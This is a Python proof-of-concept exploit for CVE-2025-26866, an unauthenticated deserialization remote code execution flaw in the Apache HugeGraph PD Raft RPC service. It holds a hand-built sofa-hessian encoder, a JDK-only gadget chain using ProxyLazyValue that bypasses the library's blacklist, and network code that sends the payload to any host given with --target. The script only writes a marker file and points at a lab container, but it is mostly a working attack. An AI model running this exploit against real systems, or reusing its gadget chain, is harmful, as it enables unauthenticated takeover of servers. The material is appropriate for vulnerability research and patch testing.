#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache HugeGraph PD Hessian2 Deserialization RCE
# CVE            : CVE-2025-26866
# Vendor         : Apache Software Foundation
# Product        : Apache HugeGraph
# Affected       : 1.0.0 – 1.5.0
# Type           : CWE-502 - Deserialization of Untrusted Data
# CVSS           : 8.8 (High)
# Platform       : Java / Linux
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Date           : 2025-12-12
#
# For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-26866 — Apache HugeGraph PD Insecure Hessian Deserialization RCE

Exploits insecure Hessian2 deserialization in the SOFABolt Raft RPC service
(port 8610) of Apache HugeGraph PD <= 1.5.0. The deserialization occurs without
adequate class filtering, allowing unauthenticated Remote Code Execution.

The sofa-hessian 3.3.6 library has a NameBlackListFilter blocking common gadget
classes (TemplatesImpl, JdbcRowSetImpl, etc.). This PoC bypasses the blacklist
using the CVE-2024-46983 technique: JDK-only classes not present in the 3.3.6
blacklist.

GADGET CHAIN (all JDK classes, none blacklisted in sofa-hessian 3.3.6):
  TreeMap.put()
    -> Rdn$RdnEntry.compareTo()
      -> UIDefaults.equals()  [Hashtable.equals()]
        -> UIDefaults.get(key)  [LazyValue evaluation]
          -> ProxyLazyValue.createValue()
            -> Constructor.newInstance() or Method.invoke()
              -> RCE (file creation / arbitrary code execution)

PROTOCOL: SOFABolt V1 RPC over TCP (port 8610)
  - 22-byte request header + className + Hessian2 content
  - className must match a registered UserProcessor for content to be deserialized
  - className: org.apache.hugegraph.pd.raft.RaftRpcProcessor$GetMemberRequest

PREREQUISITES:
  - Running CVE-2025-26866 lab container
  - Python 3 (stdlib only, no external dependencies)

REFERENCES:
  - CVE-2025-26866
  - https://github.com/apache/incubator-hugegraph/pull/2735
"""

import struct
import socket
import sys
import argparse
import subprocess
import time


# ========================================================================
#  sofa-hessian Wire Format Writer
# ========================================================================

class SofaHessianWriter:
    """
    Writes sofa-hessian 3.3.6 custom wire format.

    CRITICAL: sofa-hessian does NOT support standard Hessian 2.0 tags:
      - NO 'C' (0x43) class definition
      - NO 'H' (0x48) untyped map
      - NO 'Z' (0x5A) uppercase end marker
      - NO 0x60-0x6E compact object instances
      - NO 0x30-0x33 medium-length strings
      - NO 0x70-0x77 compact typed lists

    Format discovered empirically by analyzing sofa-hessian 3.3.6
    serialization output inside the HugeGraph PD container.
    """

    def __init__(self):
        self.buf = bytearray()
        self._type_refs = {}    # type string -> ref index (for maps/lists)
        self._class_defs = 0    # count of object class definitions

    # ---- Primitive encoding ----

    def _compact_int(self, n):
        """Encode integer in sofa-hessian compact format.

        Used for: type name lengths in object defs, field counts,
        class/type reference indices.

        Encoding:
          [-16, 47]      -> single byte (n + 0x90)
          [-2048, 2047]  -> two bytes
          [-262144, 262143] -> three bytes
          else           -> 'I' + 4-byte BE
        """
        if -16 <= n <= 47:
            return bytes([n + 0x90])
        elif -2048 <= n <= 2047:
            return bytes([0xC8 + ((n >> 8) & 0xFF), n & 0xFF])
        elif -262144 <= n <= 262143:
            return bytes([0xD4 + ((n >> 16) & 0xFF), (n >> 8) & 0xFF, n & 0xFF])
        else:
            return b'I' + struct.pack('>i', n)

    def write_null(self):
        """Write null: N (0x4E)"""
        self.buf.append(0x4E)

    def write_string(self, s):
        """Write a Hessian string value.

        Short strings (0-31 chars): <1-byte-len> <utf8>
        Long strings (32+ chars):   S <2-byte-BE-len> <utf8>
        """
        data = s.encode('utf-8')
        char_len = len(s)  # character count
        if char_len <= 31:
            self.buf.append(char_len)
            self.buf.extend(data)
        else:
            self.buf.append(0x53)  # 'S'
            self.buf.extend(struct.pack('>H', char_len))
            self.buf.extend(data)

    # ---- Type references (for maps and lists) ----

    def _write_type(self, typename):
        """Write a type string or reference for maps/lists.

        First occurrence:  t <2-byte-BE-len> <utf8-bytes>
        Subsequent:        u <compact-int-ref>
        """
        if typename in self._type_refs:
            self.buf.append(0x75)  # 'u' - type reference
            self.buf.extend(self._compact_int(self._type_refs[typename]))
        else:
            ref = len(self._type_refs)
            self._type_refs[typename] = ref
            data = typename.encode('utf-8')
            self.buf.append(0x74)  # 't' - type definition
            self.buf.extend(struct.pack('>H', len(data)))
            self.buf.extend(data)

    # ---- Maps ----

    def write_map_begin(self, typename):
        """Begin a typed map: M + type.

        Format: M t <2B-len> <type>  (first use)
                M u <compact-int>    (subsequent use of same type)
        """
        self.buf.append(0x4D)  # 'M'
        self._write_type(typename)

    def write_map_end(self):
        """End a map: z (0x7A lowercase!)

        CRITICAL: sofa-hessian uses lowercase 'z' (0x7A), NOT 'Z' (0x5A).
        """
        self.buf.append(0x7A)  # 'z'

    # ---- Objects (class definitions and instances) ----

    def write_object_def(self, classname, fields):
        """Write an object class definition and return its class ref index.

        Format: O <compact-int(strlen)> <raw-class-bytes>
                  <compact-int(nfields)> <field-string> ...

        Unlike standard Hessian 2.0 'C' tag, sofa-hessian uses 'O' for
        class definitions with compact-int encoded type name length.
        """
        class_ref = self._class_defs
        self._class_defs += 1

        data = classname.encode('utf-8')
        self.buf.append(0x4F)  # 'O' - object class definition
        self.buf.extend(self._compact_int(len(data)))
        self.buf.extend(data)
        self.buf.extend(self._compact_int(len(fields)))
        for field in fields:
            self.write_string(field)

        return class_ref

    def write_object_instance(self, class_ref):
        """Write an object instance reference.

        Format: o <compact-int(class-ref)>

        Unlike standard Hessian 2.0 compact instances (0x60-0x6E),
        sofa-hessian uses 'o' (0x6F) + compact-int for all instances.
        """
        self.buf.append(0x6F)  # 'o' - object instance
        self.buf.extend(self._compact_int(class_ref))

    # ---- Lists ----

    def write_list_begin(self, typename, count):
        """Begin a typed fixed-length list.

        Format: V t <2B-len> <type> n <raw-byte-count>

        Unlike standard Hessian 2.0 compact lists (0x70-0x77),
        sofa-hessian uses V + type + n + raw byte count.
        """
        self.buf.append(0x56)  # 'V'
        self._write_type(typename)
        self.buf.append(0x6E)  # 'n' - count tag
        self.buf.append(count & 0xFF)  # raw byte, NOT compact int

    def write_list_end(self):
        """End a list: z (0x7A)"""
        self.buf.append(0x7A)  # 'z'

    def get_bytes(self):
        """Return the assembled payload bytes."""
        return bytes(self.buf)


# ========================================================================
#  Gadget Chain Builder: ProxyLazyValue Bypass (CVE-2024-46983)
# ========================================================================

def build_proxylazyvalue_payload(marker_file="/tmp/hugegraph_rce_proof"):
    """
    Build sofa-hessian payload using the ProxyLazyValue blacklist bypass chain.

    Chain structure:
      TreeMap {
        RdnEntry1(type="a", value=UIDefaults_B{key->ProxyLazyValue}) -> "v1"
        RdnEntry2(type="a", value=UIDefaults_A{key->"dummy"})        -> "v2"
      }

    Trigger flow:
      1. MapDeserializer creates TreeMap, puts entries via TreeMap.put()
      2. Second put() calls RdnEntry2.compareTo(RdnEntry1)
      3. Same type ("a") -> calls this.value.equals(that.value)
      4. UIDefaults_A.equals(UIDefaults_B) -> Hashtable.equals()
      5. Hashtable.equals() iterates entries, calls UIDefaults_B.get(key)
      6. UIDefaults_B.get(key) finds ProxyLazyValue -> calls createValue()
      7. ProxyLazyValue.createValue() -> new FileOutputStream(marker_file)
      8. File is created on disk -> RCE proven

    The ClassCastException that follows (UIDefaults cannot be cast to String
    in RdnEntry.getValueComparable()) is expected and harmless - the file
    creation side-effect has already occurred.
    """
    w = SofaHessianWriter()

    # ── Outer container: TreeMap (triggers compareTo on keys during put) ──
    w.write_map_begin("java.util.TreeMap")

    # ── Entry 1: RdnEntry with UIDefaults containing ProxyLazyValue ──

    # Define RdnEntry class (class def 0, 2 fields: type, value)
    rdn_ref = w.write_object_def(
        "javax.naming.ldap.Rdn$RdnEntry",
        ["type", "value"]
    )

    # Instantiate RdnEntry 1
    w.write_object_instance(rdn_ref)

    # RdnEntry.type = "a"
    w.write_string("a")

    # RdnEntry.value = UIDefaults containing ProxyLazyValue
    w.write_map_begin("javax.swing.UIDefaults")

    # Key in UIDefaults
    w.write_string("x")

    # Value: ProxyLazyValue object
    # Define ProxyLazyValue class (class def 1, 4 fields)
    plv_ref = w.write_object_def(
        "javax.swing.UIDefaults$ProxyLazyValue",
        ["acc", "className", "methodName", "args"]
    )

    # Instantiate ProxyLazyValue
    w.write_object_instance(plv_ref)

    # ProxyLazyValue.acc = null (AccessControlContext - not needed)
    w.write_null()

    # ProxyLazyValue.className = "java.io.FileOutputStream"
    w.write_string("java.io.FileOutputStream")

    # ProxyLazyValue.methodName = null (use constructor, not static method)
    w.write_null()

    # ProxyLazyValue.args = Object[] { marker_file }
    w.write_list_begin("[object", 1)
    w.write_string(marker_file)
    w.write_list_end()

    # End UIDefaults_B (with ProxyLazyValue)
    w.write_map_end()

    # TreeMap value for entry 1
    w.write_string("v1")

    # ── Entry 2: RdnEntry with UIDefaults containing normal string ──

    # Reuse RdnEntry class def 0
    w.write_object_instance(rdn_ref)

    # RdnEntry.type = "a" (SAME as entry 1 -> triggers value.equals())
    w.write_string("a")

    # RdnEntry.value = UIDefaults with normal string value
    w.write_map_begin("javax.swing.UIDefaults")  # type ref reused
    w.write_string("x")      # same key as UIDefaults_B
    w.write_string("dummy")  # normal value (not a LazyValue)
    w.write_map_end()

    # TreeMap value for entry 2
    w.write_string("v2")

    # ── End TreeMap ──
    w.write_map_end()

    return w.get_bytes()


# ========================================================================
#  SOFABolt V1 Protocol
# ========================================================================

# The className that maps to a registered UserProcessor in HugeGraph PD.
# Without a matching processor, the server never deserializes the content.
BOLT_CLASS_NAME = "org.apache.hugegraph.pd.raft.RaftRpcProcessor$GetMemberRequest"


def build_sofabolt_v1_frame(content, class_name=BOLT_CLASS_NAME, request_id=1,
                            codec=0x01, timeout=5000):
    """
    Build a SOFABolt V1 RPC request frame.

    V1 Request Header (22 bytes):
      [0]     proto(1)     = 0x01 (Bolt V1)
      [1]     type(1)      = 0x01 (REQUEST)
      [2:4]   cmdCode(2)   = 0x0001 (RPC_REQUEST)
      [4]     ver2(1)      = 0x01 (command version)
      [5:9]   requestId(4)
      [9]     codec(1)     = 0x01 (Hessian2)
      [10:14] timeout(4)   (milliseconds)
      [14:16] classLen(2)
      [16:18] headerLen(2)
      [18:22] contentLen(4)
    Followed by: className bytes + header bytes + content bytes
    """
    class_bytes = class_name.encode('utf-8')
    header = struct.pack('>BBHBIBIHHI',
        0x01,               # [0]  proto: Bolt V1
        0x01,               # [1]  type: REQUEST
        0x0001,             # [2:4]  cmdCode: RPC_REQUEST
        0x01,               # [4]  ver2: command version
        request_id,         # [5:9]  requestId
        codec,              # [9]  codec: Hessian2
        timeout,            # [10:14] timeout (ms)
        len(class_bytes),   # [14:16] classLen
        0,                  # [16:18] headerLen
        len(content),       # [18:22] contentLen
    )
    return header + class_bytes + content


def build_sofabolt_v1_heartbeat():
    """Build a SOFABolt V1 heartbeat request (cmdCode=0x0000)."""
    return struct.pack('>BBHBIBIHHI',
        0x01,   # proto
        0x01,   # type: REQUEST
        0x0000, # cmdCode: HEARTBEAT
        0x01,   # ver2
        0,      # requestId
        0x01,   # codec
        0,      # timeout
        0,      # classLen
        0,      # headerLen
        0,      # contentLen
    )


def parse_bolt_v1_response(data):
    """
    Parse a SOFABolt V1 response.

    V1 Response Header (20 bytes):
      [0]     proto(1)
      [1]     type(1)      = 0x00 (RESPONSE)
      [2:4]   cmdCode(2)
      [4]     ver2(1)
      [5:9]   requestId(4)
      [9]     codec(1)
      [10:12] respStatus(2)
      [12:14] classLen(2)
      [14:16] headerLen(2)
      [16:20] contentLen(4)
    """
    if not data or len(data) < 20:
        return None

    proto, typ, cmd, ver2, reqid, codec, status, clen, hlen, conlen = \
        struct.unpack('>BBHBIBHHHI', data[:20])

    STATUS_NAMES = {
        0x0000: "SUCCESS",
        0x0001: "ERROR",
        0x0002: "SERVER_EXCEPTION",
        0x0003: "UNKNOWN",
        0x0004: "SERVER_THREADPOOL_BUSY",
        0x0005: "ERROR_COMM",
        0x0006: "NO_PROCESSOR",
        0x0007: "TIMEOUT",
        0x0008: "CLIENT_SEND_ERROR",
        0x0009: "CODEC_EXCEPTION",
        0x0010: "CONNECTION_CLOSED",
        0x0012: "SERVER_DESERIAL_EXCEPTION",
        0x0013: "SERVER_SERIAL_EXCEPTION",
    }

    result = {
        'proto': proto,
        'type': typ,
        'cmdCode': cmd,
        'ver2': ver2,
        'requestId': reqid,
        'codec': codec,
        'status': status,
        'status_name': STATUS_NAMES.get(status, f"UNKNOWN(0x{status:04x})"),
        'classLen': clen,
        'headerLen': hlen,
        'contentLen': conlen,
    }

    offset = 20
    if clen > 0 and offset + clen <= len(data):
        result['className'] = data[offset:offset+clen].decode('utf-8', errors='replace')
        offset += clen
    if hlen > 0:
        offset += hlen
    if conlen > 0 and offset + conlen <= len(data):
        result['content'] = data[offset:offset+conlen]
    elif conlen > 0:
        result['content'] = data[offset:]

    return result


# ========================================================================
#  Network I/O
# ========================================================================

def send_and_receive(host, port, frame_data, recv_timeout=5):
    """Send a frame and receive the response."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(recv_timeout)
    try:
        sock.connect((host, port))
        sock.sendall(frame_data)
        # Read response
        data = b''
        try:
            while True:
                chunk = sock.recv(4096)
                if not chunk:
                    break
                data += chunk
                # If we have at least a full header, check if we have all data
                if len(data) >= 20:
                    parsed = parse_bolt_v1_response(data)
                    if parsed:
                        expected = 20 + parsed['classLen'] + parsed['headerLen'] + parsed['contentLen']
                        if len(data) >= expected:
                            break
        except socket.timeout:
            pass
        return data
    except Exception as e:
        return None
    finally:
        sock.close()


# ========================================================================
#  Exploit Logic
# ========================================================================

def check_connectivity(host, port):
    """Verify target is reachable by sending a SOFABolt heartbeat."""
    print(f"[*] Sending heartbeat to {host}:{port}...")
    hb_frame = build_sofabolt_v1_heartbeat()
    resp_data = send_and_receive(host, port, hb_frame, recv_timeout=5)
    if resp_data and len(resp_data) >= 20:
        parsed = parse_bolt_v1_response(resp_data)
        if parsed and parsed['status'] == 0:
            print(f"[+] Heartbeat SUCCESS - target is alive")
            return True
        elif parsed:
            print(f"[*] Heartbeat response: {parsed['status_name']}")
            return True
    print(f"[-] No heartbeat response from {host}:{port}")
    return False


def exploit_file_creation(host, port, marker_file):
    """
    Primary exploit: create a marker file on the target via ProxyLazyValue.

    Returns True if the exploit was sent successfully (file creation is
    verified separately via docker exec).
    """
    print(f"\n[EXPLOIT] ProxyLazyValue blacklist bypass (CVE-2024-46983)")
    print(f"{'=' * 65}")
    print(f"[*] Target: {host}:{port}")
    print(f"[*] Marker file: {marker_file}")
    print(f"[*] Chain: TreeMap -> RdnEntry.compareTo -> UIDefaults.get -> ProxyLazyValue.createValue")
    print(f"[*] Sink: new FileOutputStream(\"{marker_file}\")")
    print()

    # Build the sofa-hessian payload
    print("[*] Building sofa-hessian payload with ProxyLazyValue gadget chain...")
    payload = build_proxylazyvalue_payload(marker_file)
    print(f"[*] Hessian2 payload: {len(payload)} bytes")

    # Show hex dump of first 128 bytes
    hex_dump = ' '.join(f'{b:02x}' for b in payload[:128])
    print(f"[*] Payload hex (first 128 bytes):\n    {hex_dump}")

    # Wrap in SOFABolt V1 frame
    print(f"\n[*] Wrapping in SOFABolt V1 frame...")
    print(f"[*] className: {BOLT_CLASS_NAME}")
    frame = build_sofabolt_v1_frame(payload)
    print(f"[*] Total frame: {len(frame)} bytes")

    # Send exploit
    print(f"\n[*] Sending exploit to {host}:{port}...")
    resp_data = send_and_receive(host, port, frame, recv_timeout=5)

    if not resp_data:
        print("[-] No response received")
        return False

    print(f"[*] Response: {len(resp_data)} bytes")
    parsed = parse_bolt_v1_response(resp_data)

    if parsed:
        print(f"[*] Status: {parsed['status_name']} (0x{parsed['status']:04x})")
        if 'className' in parsed:
            print(f"[*] Response class: {parsed['className']}")

        content_str = ""
        if 'content' in parsed:
            try:
                content_str = parsed['content'].decode('utf-8', errors='replace')
                # Truncate long content
                display = content_str[:500] + "..." if len(content_str) > 500 else content_str
                print(f"[*] Response content: {display}")
            except:
                print(f"[*] Response content: {len(parsed['content'])} bytes (binary)")

        # Analyze response for chain execution indicators
        if parsed['status'] == 0x0012:  # SERVER_DESERIAL_EXCEPTION
            if "ClassCast" in content_str and ("UIDefaults" in content_str or "String" in content_str):
                print(f"\n[+] ClassCastException detected - gadget chain EXECUTED!")
                print(f"[+] UIDefaults cannot be cast to String (expected after RCE trigger)")
                return True
            elif "blacklist" in content_str.lower():
                print(f"\n[-] Class blocked by blacklist - bypass did not work")
                return False
            elif "FileOutputStream" in content_str:
                print(f"\n[+] FileOutputStream referenced - chain likely executed!")
                return True
            else:
                print(f"\n[*] Deserialization exception - chain may have triggered")
                return True
        elif parsed['status'] == 0x0002:  # SERVER_EXCEPTION
            print(f"\n[+] SERVER_EXCEPTION - gadget chain likely executed!")
            print(f"[+] The ProxyLazyValue side-effect triggers before the error")
            return True
        elif parsed['status'] == 0x0000:  # SUCCESS
            print(f"\n[+] Request succeeded")
            return True
        else:
            print(f"\n[*] Unexpected status - check server logs")
            return True
    else:
        # Raw hex dump
        hex_resp = ' '.join(f'{b:02x}' for b in resp_data[:64])
        print(f"[*] Raw response: {hex_resp}")

    return True


def verify_rce(container_name, marker_file):
    """Verify RCE by checking if marker file exists in the container."""
    print(f"\n[VERIFY] Checking for marker file in container...")
    try:
        result = subprocess.run(
            ["docker", "exec", container_name, "ls", "-la", marker_file],
            capture_output=True, text=True, timeout=10
        )
        if result.returncode == 0:
            print(f"[+] SUCCESS! Marker file exists:")
            print(f"    {result.stdout.strip()}")
            return True
        else:
            print(f"[-] Marker file not found: {marker_file}")
            return False
    except FileNotFoundError:
        print(f"[!] 'docker' command not found - manual verification required:")
        print(f"    docker exec {container_name} ls -la {marker_file}")
        return None
    except subprocess.TimeoutExpired:
        print(f"[!] Docker exec timed out")
        return None
    except Exception as e:
        print(f"[!] Verification error: {e}")
        return None


def cleanup_marker(container_name, marker_file):
    """Remove marker file from container (pre-test cleanup)."""
    try:
        subprocess.run(
            ["docker", "exec", container_name, "rm", "-f", marker_file],
            capture_output=True, timeout=10
        )
    except:
        pass


# ========================================================================
#  Main
# ========================================================================

def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-26866: Apache HugeGraph PD Hessian2 Deserialization RCE",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  python3 poc.py                          # Default target
  python3 poc.py --target 10.0.0.1        # Custom target
  python3 poc.py --marker /tmp/pwned      # Custom marker file
  python3 poc.py --container my-container # Custom container name for verification
        """
    )
    parser.add_argument("--target", "-t", default="localhost",
                        help="Target host (default: localhost)")
    parser.add_argument("--port", "-p", type=int, default=8610,
                        help="Target port (default: 8610)")
    parser.add_argument("--marker", "-m", default="/tmp/hugegraph_rce_proof",
                        help="Marker file to create on target (default: /tmp/hugegraph_rce_proof)")
    parser.add_argument("--container", "-c", default="cve-2025-26866-vulnerable",
                        help="Docker container name for verification")
    parser.add_argument("--skip-verify", action="store_true",
                        help="Skip docker-based verification")
    args = parser.parse_args()

    print("=" * 65)
    print(" CVE-2025-26866: Apache HugeGraph PD")
    print(" Insecure Hessian Deserialization in Raft RPC -> RCE")
    print(" Blacklist bypass via CVE-2024-46983 (ProxyLazyValue)")
    print("=" * 65)
    print()

    # Step 1: Connectivity check
    if not check_connectivity(args.target, args.port):
        print("[-] Target not reachable. Aborting.")
        sys.exit(1)

    # Step 2: Clean up any existing marker file
    if not args.skip_verify:
        print(f"\n[*] Cleaning up any existing marker file...")
        cleanup_marker(args.container, args.marker)
        time.sleep(0.5)

    # Step 3: Send exploit
    sent = exploit_file_creation(args.target, args.port, args.marker)

    if not sent:
        print("\n[-] Exploit failed to send. Aborting.")
        sys.exit(1)

    # Step 4: Verify
    time.sleep(1)  # Brief delay for file system sync

    if args.skip_verify:
        print(f"\n[*] Skipping verification. Check manually:")
        print(f"    docker exec {args.container} ls -la {args.marker}")
    else:
        rce_confirmed = verify_rce(args.container, args.marker)

        print("\n" + "=" * 65)
        if rce_confirmed is True:
            print("[+] RCE CONFIRMED - CVE-2025-26866 exploitation successful!")
            print(f"[+] Created file: {args.marker} on target")
            print(f"[+] Chain: SOFABolt RPC -> Hessian2 deser -> ProxyLazyValue -> FileOutputStream")
            print("[+] Impact: Unauthenticated Remote Code Execution")
        elif rce_confirmed is False:
            print("[-] RCE NOT confirmed - marker file not found")
            print("[*] The server may have blocked the chain. Check server logs.")
            print(f"[*] docker exec {args.container} cat /hugegraph-pd/logs/hugegraph-pd.log | tail -50")
        else:
            print("[?] Verification inconclusive - manual check required")
        print("=" * 65)


if __name__ == "__main__":
    main()
